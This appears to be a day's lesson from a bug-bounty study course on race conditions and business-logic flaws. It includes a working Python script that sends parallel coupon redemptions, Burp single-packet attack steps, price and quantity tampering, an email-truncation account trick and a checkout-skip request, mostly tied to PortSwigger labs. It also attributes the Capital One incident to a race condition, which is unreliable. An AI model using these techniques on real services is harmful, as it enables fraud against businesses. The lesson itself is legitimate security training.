---
title: "Weak Area Reinforcement Day 6 — Race Conditions and Business Logic"
tags: [reinforcement, race-condition, business-logic, TOCTOU, concurrency, practice,
       bug-bounty]
module: 05-BugBountyOps-02
day: 321
related_topics:
  - Weak Area Reinforcement Day 5 (Day 320)
  - CTF Web Competition Day 4 (Day 314)
  - Access Control Review (Day 195)
---

# Day 321 — Weak Area Reinforcement Day 6: Race Conditions and Business Logic

---

## Goals

Drill race conditions and business logic vulnerabilities methodically.
These bugs require reading application intent, not running payloads.
They are frequently found in bug bounty but rarely taught rigorously.

**Time budget:** 3 hours.

---

## Part 1 — Race Condition Theory

### Why Race Conditions Exist

```
A race condition (TOCTOU — Time of Check, Time of Use) occurs when:
  1. Application checks a condition (e.g. "balance >= amount")
  2. Before the action executes, another request modifies the state
  3. Both requests pass the check and both execute

Classic: bank double-spend
  Request 1: check balance = $100. Balance ok.
  Request 2: check balance = $100. Balance ok.  ← arrives before R1 commits
  Request 1: deduct $100. Balance = $0.
  Request 2: deduct $100. Balance = -$100.   ← should have failed

Modern examples:
  - Coupon code used twice
  - Free trial activated multiple times
  - Vote/like counted multiple times
  - Concurrent file uploads with same name (overwrite)
  - Concurrent account creation with same username
```

### Tools for Race Condition Testing

```
1. Burp Suite Turbo Intruder
   - Sends N parallel requests at exact same time
   - Uses HTTP/2 single-packet attack for precision timing

2. Python with threading or asyncio
   import concurrent.futures, requests, time

3. Custom HTTP/2 client
   - h2 library allows exact same-frame delivery

4. Burp Repeater (HTTP/2) — "Send group in parallel"
   - Create a group of identical requests, send in parallel
```

### Exploit Lab

```python
# Python race condition PoC — gift card double redemption
import concurrent.futures, requests

SESSION = "your_session_cookie"
CODE = "PROMO50"

def redeem(i):
    r = requests.post(
        "https://TARGET/redeem",
        json={"code": CODE},
        cookies={"session": SESSION},
        timeout=5
    )
    print(f"[{i}] {r.status_code}: {r.text[:80]}")
    return r.status_code

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    results = list(ex.map(redeem, range(20)))

successes = sum(1 for s in results if s == 200)
print(f"\nSuccessful redemptions: {successes}")
# If > 1: race condition confirmed
```

```
PortSwigger lab: "Limit overrun race conditions"
Lab completed: Y/N
Number of successful parallel redemptions: ___
Discount applied N times: ___
```

---

## Part 2 — HTTP/2 Single-Packet Attack

```
HTTP/2 allows multiple requests in a single TCP packet.
If the server processes them concurrently, timing is extremely tight.
This eliminates network jitter — the most reliable race technique.

Burp Suite method:
  1. Send target request to Repeater.
  2. Create a tab group (Ctrl+G) with 20 identical requests.
  3. Right-click group → "Send group in parallel (single-packet attack)".
  4. Observe responses — multiple success responses = race condition.
```

---

## Part 3 — Business Logic Flaws Drill

### Price Manipulation Lab

```bash
# Proxy all requests through Burp
# Purchase an item. Intercept the cart/checkout request.
# Modify:
#   price: 0.01
#   quantity: -1  (negative quantity → negative total)
#   discount: 99  (apply unusually high discount percentage)

# PortSwigger: "Inconsistent handling of exceptional input"
# Create account with email: VERY_LONG_EMAIL@ATTACKER.COM (250+ chars)
# Server truncates to first N chars → attacker controls what truncated email is
# e.g. attacker+aaaaaa...aaa@TARGET.COM → truncates to attacker@TARGET.COM
# → account registered with admin domain email
```

### Workflow Bypass Lab

```
PortSwigger: "Insufficient workflow validation"

Normal checkout:
  1. POST /cart (add item)
  2. POST /cart/coupon (apply coupon)
  3. POST /cart/checkout
  4. GET /cart/order-confirmation?order-confirmed=true

Skip step 3 — go directly from step 2 to step 4:
  GET /cart/order-confirmation?order-confirmed=true
  → Does the server confirm the order without payment?
```

```
Workflow bypass lab completed: Y/N
Step skipped: ___
Result: ___
```

---

## Part 4 — Chaining Race + Business Logic

```
Advanced scenario:
  1. Register two attacker accounts (A and B).
  2. On Account A: initiate a balance transfer to Account B.
  3. Race: simultaneously send 20 parallel transfer requests from Account A.
  4. If race condition exists: transfer executes N times → Account A balance
     negative, Account B gains N × amount.

This is the Capital One variant:
  - Race in the withdrawal logic allowed negative balances
  - Escalated to extract other users' data via SSRF
```

---

## Post-Drill Rating

```
Area                       | Before | After
---------------------------|--------|-------
Race condition — detection |   /5   |  /5
Race condition — exploit   |   /5   |  /5
Race condition — HTTP/2    |   /5   |  /5
Business logic — price     |   /5   |  /5
Business logic — workflow  |   /5   |  /5

Real bug bounty case where race condition paid out:
  ___  (search HackerOne Hacktivity for "race condition")
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q321.1, Q321.2 …).

---

## Navigation

← Previous: [Day 320 — Weak Area Reinforcement Day 5](DAY-0320-Weak-Area-Reinforcement-Day-05.md)
→ Next: [Day 322 — Weak Area Reinforcement Day 7](DAY-0322-Weak-Area-Reinforcement-Day-07.md)
